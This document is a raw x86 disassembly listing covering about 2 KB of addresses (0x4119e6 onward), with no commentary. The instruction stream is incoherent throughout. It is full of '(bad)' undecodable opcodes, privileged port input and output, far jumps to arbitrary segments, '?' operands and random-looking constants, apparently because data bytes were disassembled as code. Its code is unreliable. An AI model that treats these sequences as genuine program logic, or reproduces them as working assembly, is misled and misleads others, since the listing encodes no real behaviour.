  4119e6:	add    eax,0x8b33c10f
  4119eb:	mov    esp,DWORD PTR [esi+0x1b8699d4]
  4119f1:	retf   
  4119f2:	push   esi
  4119f3:	adc    cl,BYTE PTR [eax+ecx*4-0x43]
  4119f7:	inc    ebp
  4119f8:	test   ch,bl
  4119fa:	pop    ebx
  4119fb:	scas   al,BYTE PTR es:[edi]
  4119fc:	cwde   
  4119fd:	mov    ds:0xef805bad,al
  411a02:	test   eax,0x2ebfd985
  411a07:	push   ds
  411a08:	ds pop ds
  411a0a:	cmp    DWORD PTR [ebx+0x7b],esi
  411a0d:	or     DWORD PTR [esi+0x6ecae75a],ebx
  411a13:	js     0x411a47
  411a15:	out    0x66,al
  411a17:	push   cs
  411a18:	fcomi  st,st(1)
  411a1a:	push   es
  411a1b:	sti    
  411a1c:	ds imul ecx,edx,0x54
  411a20:	lock xchg esi,eax
  411a22:	fs mov bh,bl
  411a25:	loopne 0x411a57
  411a27:	mov    ecx,0x88436366
  411a2c:	out    dx,al
  411a2d:	pop    esp
  411a2e:	pop    ebp
  411a2f:	cld    
  411a30:	aas    
  411a31:	sbb    esp,DWORD PTR [ebp-0x37]
  411a34:	xchg   ebx,eax
  411a35:	sub    edx,DWORD PTR [esi-0x7518026b]
  411a3b:	push   ebx
  411a3c:	ins    BYTE PTR es:[edi],dx
  411a3d:	out    dx,al
  411a3e:	scas   eax,DWORD PTR es:[edi]
  411a3f:	ror    eax,1
  411a41:	mov    al,0x1d
  411a43:	dec    esi
  411a44:	xchg   edi,eax
  411a45:	jmp    0xb8d1:0x964f785d
  411a4c:	cld    
  411a4d:	retf   
  411a4e:	dec    esi
  411a4f:	fsubp  st(5),st
  411a51:	out    0xca,al
  411a53:	dec    ebp
  411a54:	(bad)  
  411a56:	retf   0xcba8
  411a59:	neg    DWORD PTR [edi+0x5cecfd50]
  411a5f:	mul    BYTE PTR [edi]
  411a61:	div    edi
  411a63:	jmp    0x180c20ae
  411a68:	push   edx
  411a69:	adc    edx,DWORD PTR [ebx]
  411a6b:	cdq    
  411a6c:	(bad)  
  411a6d:	jle    0x411a2f
  411a6f:	xlat   BYTE PTR ds:[ebx]
  411a70:	inc    esp
  411a71:	xchg   esp,eax
  411a72:	jg     0x411ac2
  411a74:	cmp    dl,bh
  411a76:	dec    esi
  411a77:	jb     0x411a7e
  411a79:	mov    ebx,0x4354ad32
  411a7e:	pop    edx
  411a7f:	mov    DWORD PTR [ebx-0x7637f726],esi
  411a85:	out    0x7a,al
  411a87:	and    al,0x8c
  411a89:	leave  
  411a8a:	and    esp,DWORD PTR [eax+eiz*1]
  411a8d:	or     eax,0xe7f127fc
  411a92:	dec    eax
  411a93:	mov    cs,WORD PTR [eax-0x275eb8b9]
  411a99:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411a9a:	push   cs
  411a9b:	xchg   BYTE PTR [ebp-0x3e],dh
  411a9e:	and    ebx,ecx
  411aa0:	fwait
  411aa1:	jb     0x411ac7
  411aa3:	and    al,0x62
  411aa5:	cmp    BYTE PTR [ecx+0x48],bl
  411aa8:	mov    DWORD PTR [ecx+0x61],ecx
  411aab:	jge    0x411aea
  411aad:	out    0xba,eax
  411aaf:	nop
  411ab0:	mov    bh,0x1c
  411ab2:	rcl    DWORD PTR [ebx-0x1e141a6a],1
  411ab8:	dec    edi
  411ab9:	xchg   DWORD PTR [ebx+0x6],ebx
  411abc:	or     al,0x22
  411abe:	fcmovbe st,st(0)
  411ac0:	imul   DWORD PTR es:[eax]
  411ac3:	and    DWORD PTR [ebp-0x7899943d],0x3e
  411aca:	pop    ecx
  411acb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411acc:	ja     0x411b08
  411ace:	or     BYTE PTR [esi],bh
  411ad0:	push   es
  411ad1:	fwait
  411ad2:	ret    0x3f17
  411ad5:	lds    esp,FWORD PTR [edi+0x4d6cf5b3]
  411adb:	cs xor cl,ch
  411ade:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411adf:	and    al,0x74
  411ae1:	push   esp
  411ae2:	ficomp DWORD PTR [edi+0x64]
  411ae5:	sar    DWORD PTR [ebx-0x20a52555],cl
  411aeb:	popf   
  411aec:	and    eax,ebp
  411aee:	mov    ebp,0x5a502969
  411af3:	push   eax
  411af4:	inc    DWORD PTR [ecx-0x3f]
  411af7:	frstor [eax]
  411af9:	push   es
  411afa:	jae    0x411a80
  411afc:	adc    BYTE PTR [ebx+0x3d],ch
  411aff:	sbb    ebx,ebp
  411b01:	(bad)  
  411b03:	shl    BYTE PTR [esi-0x3deba436],cl
  411b09:	out    0x8d,eax
  411b0b:	(bad)  
  411b0c:	pop    eax
  411b0d:	test   eax,0xfed084a4
  411b12:	xchg   edx,eax
  411b13:	mov    edi,0xb7bbd946
  411b18:	sub    dh,bh
  411b1a:	inc    eax
  411b1b:	test   bl,bl
  411b1d:	inc    eax
  411b1e:	mov    eax,0xb7ca2a1f
  411b23:	test   DWORD PTR [edx-0x80],esi
  411b26:	jbe    0x411b8e
  411b28:	aas    
  411b29:	adc    edi,edx
  411b2b:	mov    al,ds:0x5e8771ba
  411b30:	dec    esi
  411b31:	cmp    esi,DWORD PTR ds:0x9bc4e29c
  411b37:	xchg   BYTE PTR [eax+0x59144f0f],cl
  411b3d:	or     edi,DWORD PTR [esp+ebp*1+0x31]
  411b41:	out    dx,eax
  411b42:	pop    ebx
  411b43:	adc    al,0xcd
  411b45:	addr16 dec eax
  411b47:	or     eax,0x908fe6b8
  411b4c:	or     DWORD PTR [eax-0x50d4fe5a],ebx
  411b52:	push   esp
  411b53:	pop    ecx
  411b54:	jl     0x411b9c
  411b56:	hlt    
  411b57:	or     ch,BYTE PTR [esi+0x43]
  411b5a:	(bad)  
  411b5b:	mov    bl,0x3d
  411b5d:	add    al,0x55
  411b5f:	push   edx
  411b60:	push   ds
  411b61:	je     0x411bb7
  411b63:	dec    edi
  411b64:	leave  
  411b65:	out    0x2c,al
  411b67:	sub    edi,0xd4afc1de
  411b6d:	inc    esp
  411b6e:	fst    DWORD PTR [ebp+0x45acbda]
  411b74:	sbb    ch,BYTE PTR [edx-0x3221bccc]
  411b7a:	test   DWORD PTR [ebp-0x612ecd17],eax
  411b80:	ds stos DWORD PTR es:[edi],eax
  411b82:	in     eax,dx
  411b83:	inc    BYTE PTR [eax+0x78a3130f]
  411b89:	out    0x30,eax
  411b8b:	ss mov edi,0x93edc45e
  411b91:	rol    DWORD PTR [eax+0x54bbab0f],cl
  411b97:	sbb    BYTE PTR [esi+0x74],bl
  411b9a:	lea    edx,gs:[eax+0x5f63a8e6]
  411ba1:	push   ecx
  411ba2:	sub    BYTE PTR [ebp-0x338d374a],0xe
  411ba9:	sbb    BYTE PTR [edi-0x60],bl
  411bac:	and    al,0x26
  411bae:	pop    esp
  411baf:	push   ebp
  411bb0:	das    
  411bb1:	out    0x18,eax
  411bb3:	push   ebx
  411bb4:	sti    
  411bb5:	je     0x411c2e
  411bb7:	mov    dh,0x7c
  411bb9:	dec    eax
  411bba:	js     0x411bda
  411bbc:	out    0x5b,al
  411bbe:	pop    edx
  411bbf:	push   0xffffffb5
  411bc1:	adc    dl,bh
  411bc3:	iret   
  411bc4:	adc    BYTE PTR [edi],al
  411bc6:	mov    eax,0x48960c82
  411bcb:	not    BYTE PTR [ebx-0x95a674d]
  411bd1:	pop    esp
  411bd2:	fidivr DWORD PTR [ebx-0x7a5c0a66]
  411bd8:	xchg   edi,eax
  411bd9:	jl     0x411be0
  411bdb:	jmp    0xcb3c:0xa3eedb3e
  411be2:	mov    dl,0xb4
  411be4:	pop    ebp
  411be5:	sbb    BYTE PTR [esi],ch
  411be7:	stos   DWORD PTR es:[edi],eax
  411be8:	adc    BYTE PTR [ecx-0x50],al
  411beb:	test   BYTE PTR [ecx+esi*1],dl
  411bee:	mov    al,ds:0x279d3f4d
  411bf3:	repnz mov dh,0xb
  411bf6:	mov    bl,BYTE PTR [esi]
  411bf8:	inc    ecx
  411bf9:	out    0x5a,eax
  411bfb:	sar    DWORD PTR [ebp+eiz*4-0x59],1
  411bff:	mov    eax,ds:0x6f8e4f52
  411c04:	les    ebx,FWORD PTR [eax+ebx*2]
  411c07:	int3   
  411c08:	(bad)  
  411c09:	icebp  
  411c0a:	adc    BYTE PTR [edi-0x1235180f],al
  411c10:	add    bh,BYTE PTR [eax]
  411c12:	lock out dx,eax
  411c14:	stc    
  411c15:	xor    eax,0xa9ebb527
  411c1a:	pop    edx
  411c1b:	cmp    ch,bh
  411c1d:	push   ebx
  411c1e:	ds jo  0x411c59
  411c21:	push   ss
  411c22:	mov    dl,0x71
  411c24:	cmp    al,BYTE PTR [eax]
  411c26:	pusha  
  411c27:	mov    al,BYTE PTR [ebx]
  411c29:	out    0x4,eax
  411c2b:	js     0x411c93
  411c2d:	push   ecx
  411c2e:	pop    edi
  411c2f:	and    al,0x3e
  411c31:	or     eax,0x30148d86
  411c36:	push   cs
  411c37:	ss aaa 
  411c39:	out    0xf0,al
  411c3b:	jecxz  0x411c09
  411c3d:	test   BYTE PTR [ebx+0x4f07641c],ch
  411c43:	addr16 sti 
  411c45:	(bad)  [edi+0x5c]
  411c48:	jns    0x411c30
  411c4a:	dec    ecx
  411c4b:	popa   
  411c4c:	repz add DWORD PTR [ebx],ebp
  411c4f:	pushf  
  411c50:	inc    eax
  411c51:	xor    DWORD PTR [edi+0x730801bc],esp
  411c57:	test   edx,ebp
  411c59:	push   ebx
  411c5a:	cmc    
  411c5b:	icebp  
  411c5c:	shl    DWORD PTR ds:[ebx-0x3b34e0cc],1
  411c63:	dec    ecx
  411c64:	ins    BYTE PTR es:[edi],dx
  411c65:	adc    eax,0x1494e258
  411c6a:	or     eax,0xdeaf9e84
  411c6f:	ja     0x411cb0
  411c71:	xchg   edi,eax
  411c72:	add    DWORD PTR ds:0x366e3db2,ecx
  411c78:	out    0xe5,al
  411c7a:	mov    dl,0x68
  411c7c:	es (bad) 
  411c7e:	push   esp
  411c7f:	(bad)  
  411c81:	pop    ds
  411c82:	jecxz  0x411c57
  411c84:	and    BYTE PTR [edi+0x40],ch
  411c87:	inc    esi
  411c88:	pop    edx
  411c89:	clc    
  411c8a:	das    
  411c8b:	lds    edx,FWORD PTR [edx-0xb3a729e]
  411c91:	stc    
  411c92:	adc    al,0xe2
  411c94:	pop    ebp
  411c95:	rol    eax,cl
  411c97:	xor    BYTE PTR [edx],dl
  411c99:	mov    bl,dl
  411c9b:	xor    bh,BYTE PTR [esi]
  411c9d:	inc    edi
  411c9e:	imul   esp,DWORD PTR [ecx],0xffffffd8
  411ca1:	sbb    bh,bh
  411ca3:	or     eax,0x80681dab
  411ca8:	dec    eax
  411ca9:	cmp    eax,0x22f185fc
  411cae:	mov    ah,0x92
  411cb0:	add    esi,DWORD PTR ds:0xafa2b1e9
  411cb6:	dec    ecx
  411cb7:	mov    eax,0x4764106b
  411cbc:	scas   al,BYTE PTR es:[edi]
  411cbd:	cld    
  411cbe:	out    0xf9,eax
  411cc0:	xchg   edx,eax
  411cc1:	out    0xe1,al
  411cc3:	test   esi,ecx
  411cc5:	inc    esi
  411cc6:	stos   DWORD PTR es:[edi],eax
  411cc7:	sub    bl,bh
  411cc9:	mov    WORD PTR [edx],?
  411ccb:	fwait
  411ccc:	test   eax,0xbf7853a7
  411cd1:	sahf   
  411cd2:	push   eax
  411cd3:	xchg   esi,eax
  411cd4:	jmp    esi
  411cd6:	and    al,0x58
  411cd8:	adc    al,0x30
  411cda:	iret   
  411cdb:	das    
  411cdc:	add    eax,0x8bbde419
  411ce1:	cld    
  411ce2:	pop    ebx
  411ce3:	dec    esp
  411ce4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411ce5:	add    DWORD PTR [edi+ebx*8-0x7a8bf248],esp
  411cec:	mov    ebx,0x3e5bccd8
  411cf1:	lea    esi,[edi+0x78]
  411cf4:	enter  0x365,0x24
  411cf8:	test   dh,ah
  411cfa:	and    BYTE PTR [esi-0x35],bh
  411cfd:	loop   0x411d28
  411cff:	cmp    bh,BYTE PTR [ecx+0x3eed8c86]
  411d05:	frstor [edi+0x475f94b1]
  411d0b:	pop    ds
  411d0c:	dec    edi
  411d0d:	lock nop
  411d0f:	stos   DWORD PTR es:[edi],eax
  411d10:	sub    ecx,DWORD PTR [eax+edx*1]
  411d13:	fidivr DWORD PTR [ecx]
  411d15:	(bad)  
  411d16:	stos   BYTE PTR es:[edi],al
  411d17:	cld    
  411d18:	(bad)  
  411d19:	aad    0x57
  411d1b:	clc    
  411d1c:	imul   ebp,DWORD PTR [ecx+eax*1-0x2c],0x8419c176
  411d24:	dec    edi
  411d25:	add    ebp,esp
  411d27:	pop    ebp
  411d28:	or     DWORD PTR ds:[ebp-0x37],edx
  411d2c:	ins    BYTE PTR es:[edi],dx
  411d2d:	xchg   edi,eax
  411d2e:	mov    eax,ds:0xfabe6ec1
  411d33:	dec    ebx
  411d34:	dec    esi
  411d35:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411d36:	repnz xor bl,al
  411d39:	xor    esi,DWORD PTR [edi-0x7b]
  411d3c:	ja     0x411ce0
  411d3e:	into   
  411d3f:	(bad)  
  411d40:	cmp    BYTE PTR [edi+0x4a],bl
  411d43:	mov    ch,0x4c
  411d45:	js     0x411d74
  411d47:	(bad)  
  411d48:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411d49:	in     al,0x0
  411d4b:	sbb    DWORD PTR [ebx],0xffffff8b
  411d4e:	iret   
  411d4f:	push   edi
  411d50:	fild   QWORD PTR [edi-0x36]
  411d53:	mov    ebx,0x917bf13f
  411d58:	(bad)  
  411d5a:	add    eax,0xe5f9ed
  411d5f:	mov    ds:0x547ea6c3,al
  411d64:	cdq    
  411d65:	ds adc eax,0x6967cf2d
  411d6b:	cwde   
  411d6c:	jbe    0x411d8c
  411d6e:	pop    ebx
  411d6f:	adc    dl,BYTE PTR [eax-0x3bc01d9d]
  411d75:	mov    dh,0x88
  411d77:	test   DWORD PTR [ebp+0x3ec64326],esi
  411d7d:	jmp    0x4d16996f
  411d82:	(bad)  
  411d83:	ror    al,cl
  411d85:	out    0x36,al
  411d87:	mov    esp,0x2c8e2c4a
  411d8c:	repz push eax
  411d8e:	int3   
  411d8f:	push   ebx
  411d90:	jmp    0x168f77f2
  411d95:	push   esi
  411d96:	dec    edi
  411d97:	jb     0x411d77
  411d99:	sbb    al,0x92
  411d9b:	test   ah,bh
  411d9d:	addr16 jnp 0x411d83
  411da0:	aas    
  411da1:	out    dx,eax
  411da2:	in     al,0x9a
  411da4:	cmp    DWORD PTR [ebp-0x189c2f00],eax
  411daa:	out    0xd7,al
  411dac:	jge    0x411d44
  411dae:	jb     0x411dc0
  411db0:	jecxz  0x411df0
  411db2:	lock scas eax,DWORD PTR es:[edi]
  411db4:	inc    cl
  411db6:	pusha  
  411db7:	rol    BYTE PTR [ebx+0x58b4da85],1
  411dbd:	loopne 0x411e3d
  411dbf:	scas   al,BYTE PTR es:[edi]
  411dc0:	nop
  411dc1:	sbb    DWORD PTR [ecx-0x7b4f209f],0xffffffa0
  411dc8:	xor    ebx,DWORD PTR ds:[edx]
  411dcb:	or     ah,BYTE PTR [eax+edx*8-0x48]
  411dcf:	out    0xef,eax
  411dd1:	out    0x5e,eax
  411dd3:	cld    
  411dd4:	add    DWORD PTR [eax+0x62],edx
  411dd7:	ja     0x411dca
  411dd9:	adc    eax,ebx
  411ddb:	loope  0x411d85
  411ddd:	leave  
  411dde:	pop    ecx
  411ddf:	js     0x411deb
  411de1:	mov    ds:0xe650f2d5,al
  411de6:	sbb    bh,dl
  411de8:	inc    ecx
  411de9:	pop    edx
  411dea:	es push esp
  411dec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411ded:	jl     0x411d9d
  411def:	mov    al,0x1d
  411df1:	mov    ebp,0x91b5805b
  411df6:	mov    dh,0x87
  411df8:	push   edx
  411df9:	add    edi,DWORD PTR [ebx-0x7b]
  411dfc:	and    eax,0x3ec26220
  411e01:	xlat   BYTE PTR ds:[ebx]
  411e02:	outs   dx,BYTE PTR ds:[esi]
  411e03:	pop    ss
  411e04:	sub    dl,ch
  411e06:	add    bl,BYTE PTR [ebx-0x38]
  411e09:	out    0x14,eax
  411e0b:	popa   
  411e0c:	mov    BYTE PTR [esp+ebp*1],dl
  411e0f:	and    DWORD PTR [ecx-0x6393af9b],edi
  411e15:	nop
  411e16:	pop    edx
  411e17:	(bad)  
  411e18:	mov    esi,0xd21f57f2
  411e1d:	mov    ebx,0x55008573
  411e22:	sub    eax,eax
  411e24:	dec    eax
  411e25:	cmp    eax,0x4fc2bd85
  411e2a:	sti    
  411e2b:	test   BYTE PTR [ecx-0x31],al
  411e2e:	jg     0x411e57
  411e30:	fadd   st(5),st
  411e32:	fimul  WORD PTR [edx-0x15d6d7d4]
  411e38:	add    al,0x2
  411e3a:	ret    
  411e3b:	gs fild DWORD PTR ds:[eax+0x7ecd48c6]
  411e43:	daa    
  411e44:	imul   esp,edi,0x1e
  411e47:	inc    edi
  411e48:	sub    ebx,DWORD PTR [ecx]
  411e4a:	sub    ebx,DWORD PTR ds:[esi+0x3fbdb3d4]
  411e51:	adc    BYTE PTR [edx+0x4c],bl
  411e54:	mov    bh,0x3
  411e56:	and    BYTE PTR [eax-0x7be5cfc0],dh
  411e5c:	sub    al,0xcb
  411e5e:	sub    cl,dl
  411e60:	ds fwait
  411e62:	pushf  
  411e63:	pop    edx
  411e64:	jne    0x411e60
  411e66:	xor    bh,BYTE PTR [esp+edx*2-0x4493f907]
  411e6d:	jg     0x411e33
  411e6f:	retf   
  411e70:	add    esi,DWORD PTR ds:0x2930009b
  411e76:	sbb    dl,BYTE PTR [edx-0x7b]
  411e79:	adc    BYTE PTR [eax-0x448f494c],ch
  411e7f:	shr    BYTE PTR [eax-0x1],1
  411e82:	pop    ebp
  411e83:	mov    eax,ds:0x858d798c
  411e88:	cmc    
  411e89:	test   al,dl
  411e8b:	std    
  411e8c:	dec    ecx
  411e8d:	mov    ebp,0x7ceae2b8
  411e92:	test   DWORD PTR ss:[edx+0x54],ebx
  411e96:	pop    es
  411e97:	inc    esp
  411e98:	in     al,dx
  411e99:	jbe    0x411ec8
  411e9b:	test   esp,eax
  411e9d:	mov    BYTE PTR [edi-0x76],cl
  411ea0:	aas    
  411ea1:	add    DWORD PTR [ebp+0x47],esp
  411ea4:	repz (bad) 
  411ea6:	ja     0x411e32
  411ea8:	mov    al,0xe7
  411eaa:	(bad)  
  411eab:	lods   al,BYTE PTR ds:[esi]
  411eac:	test   BYTE PTR [edi-0x5b],ah
  411eaf:	inc    ebp
  411eb0:	ins    DWORD PTR es:[edi],dx
  411eb1:	ds add al,0x1d
  411eb4:	pop    esp
  411eb5:	les    ebx,FWORD PTR [edx+0x32]
  411eb8:	cmc    
  411eb9:	cwde   
  411eba:	gs je  0x411e61
  411ebd:	mov    ch,0xfe
  411ebf:	test   BYTE PTR [esi],dl
  411ec1:	(bad)  
  411ec2:	into   
  411ec3:	adc    eax,0xc68ddd3f
  411ec8:	jle    0x411e74
  411eca:	mov    edx,0x46e1c02a
  411ecf:	push   ecx
  411ed0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411ed1:	in     eax,dx
  411ed2:	jmp    0x8e97d13
  411ed7:	and    cl,dh
  411ed9:	repz fcomp DWORD PTR es:[ebx-0x1c]
  411ede:	pop    ebp
  411edf:	cmp    al,0xec
  411ee1:	inc    ebp
  411ee2:	pop    edi
  411ee3:	xchg   esp,eax
  411ee4:	jle    0x411f45
  411ee6:	nop
  411ee7:	fst    st(2)
  411ee9:	mov    ecx,ds
  411eeb:	test   DWORD PTR [eax+0x76],eax
  411eee:	rol    DWORD PTR [esi+edi*1],cl
  411ef1:	jne    0x411f41
  411ef3:	jecxz  0x411e97
  411ef5:	out    0xc3,al
  411ef7:	xchg   ebp,eax
  411ef8:	stc    
  411ef9:	out    0xd4,al
  411efb:	rol    DWORD PTR [ecx],1
  411efd:	int    0x93
  411eff:	mov    ds:0x82280f7a,eax
  411f04:	addr16 out 0x2f,eax
  411f07:	cs int3 
  411f09:	mov    ?,edi
  411f0b:	jne    0x411f22
  411f0d:	ja     0x411ed5
  411f0f:	inc    esp
  411f10:	xlat   BYTE PTR ds:[ebx]
  411f12:	or     DWORD PTR [ebp-0x15],edx
  411f15:	outs   dx,DWORD PTR ds:[esi]
  411f16:	shl    BYTE PTR [ebp-0x3c],cl
  411f19:	mov    ds:0x573fed06,eax
  411f1e:	mov    al,0xce
  411f20:	stos   DWORD PTR es:[edi],eax
  411f21:	pop    ss
  411f22:	pop    esi
  411f23:	push   bp
  411f25:	jecxz  0x411edf
  411f27:	ss pop es
  411f29:	adc    BYTE PTR [edx+0x25],al
  411f2c:	xor    al,ah
  411f2e:	sbb    eax,0xd4038a99
  411f33:	inc    esp
  411f34:	xlat   BYTE PTR ds:[ebx]
  411f35:	call   0xe65b:0x732ae464
  411f3c:	fmul   QWORD PTR ds:0x6c8749fd
  411f42:	pop    ebx
  411f43:	or     edi,DWORD PTR [ebp+0x4c24043f]
  411f49:	packuswb mm5,QWORD PTR [esi-0x7cce0256]
  411f50:	pop    ss
  411f51:	inc    esi
  411f52:	inc    ecx
  411f53:	cs shl bh,cl
  411f56:	mov    edx,0xfbf5b671
  411f5b:	inc    ebp
  411f5c:	and    dl,BYTE PTR [edi+0x3f]
  411f5f:	jbe    0x411f55
  411f61:	out    0x29,al
  411f63:	add    al,0xce
  411f65:	push   0xe741ca23
  411f6a:	jb     0x411fa5
  411f6c:	arpl   WORD PTR [eax],dx
  411f6e:	rcl    DWORD PTR [edx+0x4e45efe2],cl
  411f74:	pop    edx
  411f75:	lock pop edx
  411f77:	and    ah,BYTE PTR ds:0x78b8af43
  411f7d:	adc    eax,0xce8a8584
  411f82:	lock or edi,DWORD PTR [ecx]
  411f85:	jge    0x411f57
  411f87:	lock pop ecx
  411f89:	inc    edi
  411f8a:	sbb    dl,dl
  411f8c:	add    esi,esp
  411f8e:	add    eax,0xcb4ed280
  411f93:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411f94:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411f95:	or     DWORD PTR [esi],eax
  411f97:	test   DWORD PTR [esp+esi*4],ebp
  411f9a:	and    eax,0xa8e2f2fb
  411f9f:	inc    esi
  411fa0:	add    ecx,DWORD PTR [ebx-0x3a8571a5]
  411fa6:	sbb    BYTE PTR [ebx],0xbc
  411fa9:	cmp    ebx,DWORD PTR [esi-0x7d]
  411fac:	add    eax,0xa83da590
  411fb1:	fxch   st(2)
  411fb3:	dec    ebx
  411fb4:	lahf   
  411fb5:	mov    DWORD PTR [edx-0x4e],ebx
  411fb8:	inc    esi
  411fb9:	and    DWORD PTR [eax],esi
  411fbb:	fdiv   DWORD PTR [eax-0x56]
  411fbe:	mov    ds:0x797d1b84,eax
  411fc3:	pop    esi
  411fc4:	ds aad 0xf9
  411fc7:	imul   ebx,DWORD PTR [edi-0xf],0xe7793efc
  411fce:	pushf  
  411fcf:	icebp  
  411fd0:	jns    0x411fd6
  411fd2:	or     eax,0xf40e3aa3
  411fd7:	adc    ebp,DWORD PTR ds:0xd4525b44
  411fdd:	cmp    bl,BYTE PTR [esi-0x51188c80]
  411fe3:	inc    ecx
  411fe4:	xchg   edi,eax
  411fe5:	jno    0x411f8a
  411fe7:	ret    
  411fe8:	adc    esp,DWORD PTR [ebp+ecx*8+0x2c]
  411fec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411fed:	xchg   ebx,eax
  411fee:	mov    ebx,0x8dd93edb
  411ff3:	jnp    0x411feb
  411ff5:	test   al,0x71
  411ff7:	stc    
  411ff8:	out    dx,al
  411ff9:	scas   al,BYTE PTR es:[edi]
  411ffa:	sub    al,0xdc
  411ffc:	push   es
  411ffd:	out    0x28,eax
  411fff:	sbb    al,0xc1
  412001:	xchg   ebx,eax
  412002:	jp     0x412005
  412004:	inc    esp
  412005:	jae    0x411fb3
  412007:	(bad)  
  412008:	sub    al,0xb2
  41200a:	rol    BYTE PTR [eax+edi*2-0x52d45382],1
  412011:	out    0x88,al
  412013:	pop    ecx
  412014:	cdq    
  412015:	movmskps ebp,xmm5
  412018:	(bad)  
  412019:	loope  0x41207f
  41201b:	xchg   esp,eax
  41201c:	jb     0x411fd3
  41201e:	pop    ebx
  41201f:	inc    eax
  412020:	mov    edx,0xc46061d2
  412025:	(bad)  
  412026:	inc    BYTE PTR [ebp-0x30fd114f]
  41202c:	xor    DWORD PTR [ebx+0x41],edx
  41202f:	clc    
  412030:	cmp    esp,ebp
  412032:	ret    0x7651
  412035:	pop    es
  412036:	(bad)  [edi+0x13]
  412039:	out    dx,eax
  41203a:	inc    esi
  41203b:	gs xchg ebp,eax
  41203d:	cdq    
  41203e:	xor    DWORD PTR [edi],ebx
  412040:	mov    ecx,0xad7a726a
  412045:	js     0x4120b2
  412047:	xor    al,0x62
  412049:	out    0x74,al
  41204b:	jo     0x412046
  41204d:	mov    ah,0xd1
  41204f:	jae    0x4120ab
  412051:	fiadd  WORD PTR ds:0x5affccea
  412057:	inc    edx
  412058:	xchg   ebx,eax
  412059:	lea    ecx,[eax+ecx*4+0x7f14e766]
  412060:	pusha  
  412061:	pop    esi
  412062:	mov    eax,ds:0x3690c8
  412067:	mov    ecx,0xe2644028
  41206c:	dec    ecx
  41206d:	out    0x65,eax
  41206f:	nop
  412070:	jb     0x412060
  412072:	sub    ah,0x93
  412075:	in     eax,dx
  412076:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412077:	test   DWORD PTR ds:0x4cab8ace,0xda845d80
  412081:	and    ebp,0x2a
  412084:	jle    0x4120de
  412086:	pop    ebx
  412087:	xor    BYTE PTR [ecx+0x14],dh
  41208a:	and    eax,edi
  41208c:	loop   0x41207b
  41208e:	pop    esi
  41208f:	mov    edx,DWORD PTR [ebp+0x73c1eee6]
  412095:	adc    DWORD PTR [esi+0x7],ecx
  412098:	sar    DWORD PTR [ecx+0x42306455],cl
  41209e:	mov    ?,WORD PTR [eax+0x1b]
  4120a1:	mul    bh
  4120a3:	lds    ebp,FWORD PTR [edx]
  4120a5:	out    0x3a,al
  4120a7:	jmp    DWORD PTR [ebx]
  4120a9:	sbb    DWORD PTR [eax],eax
  4120ab:	adc    eax,esp
  4120ad:	(bad)  
  4120ae:	out    dx,eax
  4120af:	push   ss
  4120b0:	mov    BYTE PTR [ecx-0x1bc25ba5],bl
  4120b6:	adc    BYTE PTR [eax],cl
  4120b8:	mov    al,0x8c
  4120ba:	dec    edx
  4120bb:	test   BYTE PTR [esi+0x3f8ba932],al
  4120c1:	stc    
  4120c2:	push   eax
  4120c3:	mov    eax,0x447375ab
  4120c8:	shl    bh,cl
  4120ca:	and    ah,BYTE PTR [eax+0x27]
  4120cd:	dec    ebx
  4120ce:	dec    eax
  4120cf:	mov    al,0x35
  4120d1:	mov    ch,0xe
  4120d3:	cmp    dh,BYTE PTR [ebp-0x6c]
  4120d6:	das    
  4120d7:	mov    edx,0x84745961
  4120dc:	cmp    ah,dl
  4120de:	inc    ebx
  4120df:	arpl   WORD PTR [eax-0x1e785ea4],si
  4120e5:	mov    edx,edi
  4120e7:	inc    ebp
  4120e8:	mov    ds:0xfe5dcab9,eax
  4120ed:	fistp  DWORD PTR [edx+0xe]
  4120f0:	push   ds
  4120f1:	lea    esi,[edx+0x42661309]
  4120f7:	shr    BYTE PTR [ecx-0x184b051a],0xd1
  4120fe:	mov    cl,0xd3
  412100:	add    eax,esi
  412102:	imul   esi,DWORD PTR [eax+0x66b2e53f],0x462a66ef
  41210c:	(bad)  
  41210d:	popf   
  41210e:	cmp    al,0x81
  412110:	cmp    al,0x5d
  412112:	mov    DWORD PTR [ebx],ecx
  412114:	aas    
  412115:	and    cl,ah
  412117:	add    eax,0x55a311c9
  41211c:	mul    edi
  41211e:	sub    esp,DWORD PTR [edx+0x5f]
  412121:	cmp    al,0x22
  412123:	ins    DWORD PTR es:[edi],dx
  412124:	daa    
  412125:	out    0xdc,al
  412127:	inc    ebp
  412128:	(bad)  
  412129:	stc    
  41212a:	cmp    DWORD PTR [edx-0x1a],eax
  41212d:	int    0x6d
  41212f:	retf   
  412130:	inc    eax
  412131:	push   edx
  412132:	pop    edx
  412133:	fimul  WORD PTR [esi-0x3fd1aa5f]
  412139:	cmp    al,BYTE PTR ds:0xae0ad885
  41213f:	stos   DWORD PTR es:[edi],eax
  412140:	sbb    DWORD PTR ds:[eax],edi
  412143:	sahf   
  412144:	sbb    DWORD PTR [esi],eax
  412146:	int    0xc6
  412148:	mov    ch,0xe5
  41214a:	loopne 0x412173
  41214c:	js     0x412109
  41214e:	out    0x39,al
  412150:	ja     0x4120d9
  412152:	lods   al,BYTE PTR ds:[esi]
  412153:	mov    edi,0x7023f94e
  412158:	adc    edx,DWORD PTR [edx]
  41215a:	add    eax,0x32adf087
  41215f:	xor    al,0x9f
  412161:	out    0xba,eax
  412163:	scas   al,BYTE PTR es:[edi]
  412164:	inc    esi
  412165:	mov    esi,0x92e1f8f4
  41216a:	pusha  
  41216b:	or     ch,BYTE PTR [edi+0x4e885bcc]
  412171:	jl     0x4121c7
  412173:	dec    eax
  412174:	sbb    dl,BYTE PTR [ebx+0x40]
  412177:	call   0xb413:0xfe9ea5fe
  41217e:	mov    esp,0x5b166d6e
  412183:	call   0xe641:0xd207415a
  41218a:	mov    ?,WORD PTR [eax+0x4]
  41218d:	shr    BYTE PTR [edi-0x76],0xa7
  412191:	gs mov ch,0xbd
  412194:	je     0x41211f
  412196:	push   esp
  412197:	stos   BYTE PTR es:[edi],al
